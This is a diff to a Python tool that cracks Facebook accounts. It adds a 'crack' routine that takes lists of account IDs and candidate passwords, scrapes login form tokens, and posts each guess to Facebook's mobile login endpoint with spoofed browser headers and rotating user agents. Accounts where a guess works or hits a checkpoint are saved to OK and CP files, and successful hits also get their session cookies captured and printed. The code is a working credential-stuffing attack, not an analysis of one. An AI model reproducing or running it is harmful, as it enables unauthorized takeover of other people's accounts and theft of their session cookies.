@@ -610,7 +610,7 @@ def passwrd():
                     pass
                 
                 if "validate" in method:
-                    pool.submit(validate, idf, pwv,'m.prod.facebook.com')
+                    pool.submit(crack, idf, pwv)
                 else:
                     pool.submit(validate, idf, pwv,'m.prod.facebook.com')
         print("")
@@ -628,6 +628,93 @@ def passwrd():
     print("thanks Rudal-XD")
     print("")
 
+#----------[ METODE-LAWAK ]----------#
+def crack(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
+	#ua = useragent()
+	ua = random.choice(ugen) 
+	ses = requests.Session()
+	prog.update(des,description=f"{h}Lawak V2{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.advance(des) 
+	for pw in pwv:
+		try:
+			if 'ya' in uman: ua = usman1[0]
+			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2572246932852997&kid_directed_site=0&app_id=2572246932852997&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2572246932852997%26cbt%3D1680997745004%26e2e%3D%257B%2522init%2522%253A1680997745004%257D%26ies%3D1%26sdk%3Dandroid-11.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i9u2k7fe0ha0ss8moro8%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pure.indosat.care%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbc5a75ae-2b5b-4472-a65e-f9c2358a25e7%26tp%3Dunspecified%26refsrc%3Ddeprecated%26__req%3D9%26_rdr&cancel_url=fbconnect%3A%2F%2Fcct.com.pure.indosat.care%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i9u2k7fe0ha0ss8moro8%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			data = {
+'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
+'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
+'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
+'email': idf,
+'prefill_contact_point': f'{idf} {pw}', 
+'prefill_source': 'provided_or_soft_matched',
+'prefill_type': 'contact_point',
+'first_prefill_source': 'provided_or_soft_matched',
+'first_prefill_type': 'contact_point',
+'had_cp_prefilled': True, 
+'had_password_prefilled': False, 
+'is_smart_lock': False, 
+'bi_xrwh': '0',
+'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
+'fb_dtsg': '',
+'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1)
+}
+			heade = {
+'Host':'m.facebook.com',
+'x-fb-rlafr': '0',
+'access-control-allow-origin': '*',
+'pragma': 'no-cache',
+'cache-control': 'private, no-cache, no-store, must-revalidate',
+'x-fb-debug':'Ar808puA9haE5G4ec9zVAcFGinnes6bGoqixLonN/y5Q6rn9EcYoI4u3yLxGxJDpKRXuHAOiLuDHUPAeSTdPtg==',
+'content-length':f"{len(str(data))}",
+'cache-control': 'max-age=0',
+'save-data': 'on',
+'upgrade-insecure-requests':'1',
+'strict-transport-security':'max-age=15552000; preload',
+'sec-ch-ua':'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
+'sec-ch-ua-mobile':'?0',
+'user-agent':ua,
+'content-type':'application/x-www-form-urlencoded',
+'sec-ch-ua-platform': '"Android"',
+'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'origin': 'https://m.facebook.com',
+'sec-fetch-site': 'same-origin',
+'sec-fetch-mode': 'cors',
+'sec-fetch-dest': 'empty',
+'referer':'https://m.facebook.com/v11.0/dialog/oauth?cct_prefetching=0&client_id=2572246932852997&cbt=1680997745004&e2e=%7B%22init%22%3A1680997745004%7D&ies=1&sdk=android-11.3.0&sso=chrome_custom_tab&scope=public_profile&state=%7B%220_auth_logger_id%22%3A%22bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22i9u2k7fe0ha0ss8moro8%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.pure.indosat.care&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=bc5a75ae-2b5b-4472-a65e-f9c2358a25e7&tp=unspecified&refsrc=deprecated&__req=9&_rdr',
+'accept-encoding':'gzip, deflate',
+'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'
+}
+			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?api_key=2572246932852997&amp;auth_token=b10a270eda3984411307133724f5523e&amp;skip_api_login=1&amp;signed_next=1&amp;next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2572246932852997%26cbt%3D1680997745004%26e2e%3D%257B%2522init%2522%253A1680997745004%257D%26ies%3D1%26sdk%3Dandroid-11.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i9u2k7fe0ha0ss8moro8%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pure.indosat.care%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbc5a75ae-2b5b-4472-a65e-f9c2358a25e7%26tp%3Dunspecified%26refsrc%3Ddeprecated%26__req%3D9%26_rdr&amp;refsrc=deprecated&amp;app_id=2572246932852997&amp;cancel=fbconnect%3A%2F%2Fcct.com.pure.indosat.care%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bc5a75ae-2b5b-4472-a65e-f9c2358a25e7%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i9u2k7fe0ha0ss8moro8%2522%257D&amp;lwv=100&amp;locale2=id_ID&amp;refid=9',data=data,headers=heade,allow_redirects=True) 
+			if "checkpoint" in po.cookies.get_dict().keys():
+				tree = Tree(f" ")
+				tree.add(f"[bold yellow]{idf}|{pw}")
+				tree.add(f"[bold yellow]{ua}\n")
+				cetak(tree)
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				tree = Tree(f"  ")
+				tree.add(f"[bold green]{idf}|{pw}")
+				tree.add(f"[bold green]{kuki}")
+				tree.add(f"[bold green]{ua}\n")
+				cetak(tree) 
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				cek_apk(session,coki)
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 #----------[ METODE-VALIDATE ]----------#	
 def validate(idf,pwv,url):
     global loop,ok,cp
